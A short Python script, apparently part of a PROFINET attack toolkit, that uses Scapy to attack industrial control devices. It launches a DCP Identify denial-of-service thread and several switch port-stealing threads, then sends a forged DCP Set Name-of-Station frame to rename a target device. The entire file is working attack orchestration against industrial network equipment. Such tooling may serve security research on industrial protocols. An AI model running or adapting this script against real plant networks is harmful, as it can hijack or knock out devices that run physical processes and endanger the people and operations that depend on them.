#!/usr/bin/env python3

from threading import Thread
from scapy.all import *
from identify import DCPIdentify
from port_stealing import  PortStealing
from set_attack import DCPSetAttack
from dcp_identify_name_dos_attack import DCPIdentifyNameAttack

ps = PortStealing()
dcp_set_attack = DCPSetAttack()
dcp_denial_of_service = DCPIdentifyNameAttack()

set_name = dcp_set_attack.dcp_set_name_of_station_request(dcp_set_attack.TARGET_MAC, name=dcp_set_attack.TARGET_NAME)

dcp_dos_thread = Thread(target=dcp_denial_of_service.sniff_requests)
dcp_dos_thread.start()

for x in range(0, int(ps.THREADS)):
    print("Start thread ", str(x))
    steal_thread = Thread(target=ps.steal_port)
    steal_thread.start()

time.sleep(2)

sendp(set_name, iface=dcp_set_attack.IFACE)
ps.is_running = False